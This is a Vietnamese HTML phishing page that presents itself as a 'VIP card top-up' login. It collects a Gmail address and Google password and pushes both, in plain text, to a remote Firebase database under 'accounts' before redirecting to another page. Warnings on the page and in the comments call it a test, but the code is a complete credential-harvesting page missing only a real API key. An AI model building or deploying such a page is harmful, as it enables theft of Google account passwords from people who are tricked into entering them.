<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Nạp Thẻ VIP - Đăng Nhập Thủ Công</title>
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSy...thay bằng apiKey thật...",
      authDomain: "quocdat-sec.firebaseapp.com",
      databaseURL: "https://quocdat-sec-default-rtdb.firebaseio.com",
      projectId: "quocdat-sec",
      storageBucket: "quocdat-sec.appspot.com",
      messagingSenderId: "...",
      appId: "..."
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    window.addEventListener('DOMContentLoaded', () => {
      const form = document.getElementById('login-form');
      const status = document.getElementById('status');

      form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();

        if (!email || !password) {
          status.textContent = 'Vui lòng nhập đầy đủ email và mật khẩu!';
          status.style.color = 'red';
          return;
        }

        if (!email.endsWith('@gmail.com')) {
          status.textContent = 'Chỉ chấp nhận email Gmail!';
          status.style.color = 'red';
          return;
        }

        try {
          status.textContent = 'Đang lưu...';
          status.style.color = 'yellow';

          // Lưu vào Firebase (node /accounts/, dùng push để tạo ID tự động)
          const newRef = push(ref(db, 'accounts'));
          await set(newRef, {
            email: email,
            password: password,          // Lưu mật khẩu thủ công (rủi ro!)
            timestamp: new Date().toISOString(),
            note: 'Đăng nhập thủ công - KHÔNG dùng tài khoản thật!'
          });

          status.textContent = 'Lưu thành công! Chuyển đến kho lưu trữ...';
          status.style.color = 'lime';

          setTimeout(() => {
            window.location.href = 'lutrugg.html';
          }, 1500);
        } catch (err) {
          status.textContent = 'Lỗi: ' + err.message;
          status.style.color = 'red';
          console.error(err);
        }
      });
    });
  </script>

  <style>
    body { font-family: Arial; background:#0f0c29; color:#e0e0e0; padding:40px; text-align:center; }
    h1 { color:#00d4ff; }
    form { max-width:400px; margin:40px auto; background:rgba(30,30,50,0.8); padding:30px; border-radius:12px; border:1px solid #444; }
    input { width:100%; padding:12px; margin:10px 0; border-radius:6px; border:1px solid #555; background:#1e1e2e; color:white; }
    button { background:linear-gradient(90deg,#00d4ff,#0077ff); color:white; border:none; padding:14px; font-size:1.1rem; border-radius:50px; cursor:pointer; width:100%; margin-top:20px; }
    #status { margin-top:20px; font-weight:bold; }
  </style>
</head>
<body>

  <h1>ĐĂNG NHẬP THỦ CÔNG</h1>
  <p style="color:#aaa;">Nhập Gmail + Mật khẩu Google (chỉ test, KHÔNG dùng thật!)</p>

  <form id="login-form">
    <input type="email" id="email" placeholder="Email Gmail (ví dụ: test@gmail.com)" required>
    <input type="password" id="password" placeholder="Mật khẩu Google" required>
    <button type="submit">Đăng Nhập & Lưu</button>
  </form>

  <div id="status"></div>

  <p style="color:#ff9800; margin-top:40px; font-size:0.9rem;">
    Cảnh báo: Mật khẩu bạn nhập sẽ được lưu vào Firebase (rất nguy hiểm!). Chỉ dùng cho test.
  </p>

</body>
</html>
